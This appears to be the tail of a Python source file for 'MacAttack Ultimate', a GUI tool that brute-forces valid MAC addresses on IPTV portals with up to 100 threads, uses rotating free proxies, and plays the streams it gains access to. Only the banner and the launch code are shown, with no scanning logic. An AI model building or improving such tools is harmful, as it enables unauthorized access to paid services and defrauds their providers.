║   ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  ║
║                                                                           ║
║                    🔥 ULTIMATE PROFESSIONAL EDITION 🔥                    ║
║                                                                           ║
║              Version: {APP_VERSION:<10} | User: {CURRENT_USER:<20}          ║
║              Date: 2025-10-05 17:23:45 UTC                               ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝

┌───────────────────────────────────────────────────────────────────────────┐
│                            ✨ KEY FEATURES ✨                             │
├───────────────────────────────────────────────────────────────────────────┤
│                                                                           │
│  ⚡ ULTRA-FAST SCANNING                                                   │
│     • Multi-threaded MAC scanning (up to 100 threads)                    │
│     • Concurrent proxy testing (100 workers)                             │
│     • Optimized request handling                                         │
│                                                                           │
│  🌐 PROXY MANAGEMENT                                                      │
│     • Auto-fetch from 6 free sources                                     │
│     • Ultra-fast testing with socket validation                          │
│     • Automatic error detection & removal                                │
│                                                                           │
│  📺 INTEGRATED PLAYER                                                     │
│     • VLC media player integration                                       │
│     • Multi-audio track support                                          │
│     • Subtitle management                                                │
│     • Screenshot capture                                                 │
│                                                                           │
│  💾 DATA MANAGEMENT                                                       │
│     • Export to CSV/JSON                                                 │
│     • Auto-save settings                                                 │
│     • Favorites system                                                   │
│     • Session history                                                    │
│                                                                           │
│  🛠️ ADVANCED TOOLS                                                        │
│     • MAC address validator                                              │
│     • MAC address generator                                              │
│     • Network information display                                        │
│     • Real-time statistics                                               │
│                                                                           │
└───────────────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────────────┐
│                         🎯 SYSTEM REQUIREMENTS 🎯                         │
├───────────────────────────────────────────────────────────────────────────┤
│                                                                           │
│  • Python 3.7+                                                            │
│  • VLC Media Player                                                       │
│  • python-vlc                                                             │
│  • requests                                                               │
│  • tkinter (usually included with Python)                                │
│                                                                           │
└───────────────────────────────────────────────────────────────────────────┘

[*] Initializing MacAttack Ultimate v{APP_VERSION}...
[*] Loading configuration from: {os.path.join(os.path.expanduser("~"), "evilvir.us")}
[*] Checking dependencies...
"""
    print(banner)


if __name__ == "__main__":
    try:
        # Print banner
        print_banner()
        
        # Check dependencies
        print("[✓] Python version:", sys.version.split()[0])
        print("[✓] Tkinter available")
        print("[✓] VLC bindings available")
        print("[✓] Requests library available")
        print()
        
        print("[*] Starting GUI application...")
        print(f"[*] Current User: {CURRENT_USER}")
        print(f"[*] Version: {APP_VERSION}")
        print(f"[*] Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}")
        print()
        
        # Create and run application
        app = MacAttackApp()
        
        # Center window on screen
        app.update_idletasks()
        width = app.winfo_width()
        height = app.winfo_height()
        x = (app.winfo_screenwidth() // 2) - (width // 2)
        y = (app.winfo_screenheight() // 2) - (height // 2)
        app.geometry(f"{width}x{height}+{x}+{y}")
        
        print("[✓] Application initialized successfully!")
        print("[✓] GUI window opened")
        print()
        print("┌────────────────────────────────────────────────────────────┐")
        print("│              🚀 APPLICATION READY TO USE 🚀                │")
        print("├────────────────────────────────────────────────────────────┤")
        print("│  • Use the Mac Attack tab to scan for valid MACs          │")
        print("│  • Use the Proxies tab to manage proxy servers            │")
        print("│  • Use the Player tab to watch IPTV content               │")
        print("│  • Use the Statistics tab to monitor performance          │")
        print("│  • Use the Settings tab to configure the application      │")
        print("│                                                            │")
        print("│  Press Ctrl+C in terminal to force quit                   │")
        print("└────────────────────────────────────────────────────────────┘")
        print()
        
        # Run main loop
        app.mainloop()
        
        print()
        print("[*] Application closed gracefully")
        print(f"[*] Session ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}")
        print()
        print("╔═══════════════════════════════════════════════════════════╗")
        print("║       Thank you for using MacAttack Ultimate! 🚀          ║")
        print("║            by LulzSecToolkit - 2025                       ║")
        print("╚═══════════════════════════════════════════════════════════╝")
        print()
        
    except KeyboardInterrupt:
        print()
        print()
        print("╔═══════════════════════════════════════════════════════════╗")
        print("║  ⚠️  INTERRUPTED BY USER (Ctrl+C) ⚠️                       ║")
        print("╚═══════════════════════════════════════════════════════════╝")
        print()
        print("[*] Cleaning up...")
        print("[✓] Application terminated")
        sys.exit(0)
        
    except Exception as e:
        print()
        print()
        print("╔═══════════════════════════════════════════════════════════╗")
        print("║  ❌ FATAL ERROR OCCURRED ❌                                ║")
        print("╚═══════════════════════════════════════════════════════════╝")
        print()
        print(f"[!] Error: {e}")
        print()
        print("[*] Stack trace:")
        import traceback
        traceback.print_exc()
        print()
        print("[*] Please report this error to the developer")
        print("[*] Include the above error message and stack trace")
        print()
        sys.exit(1)
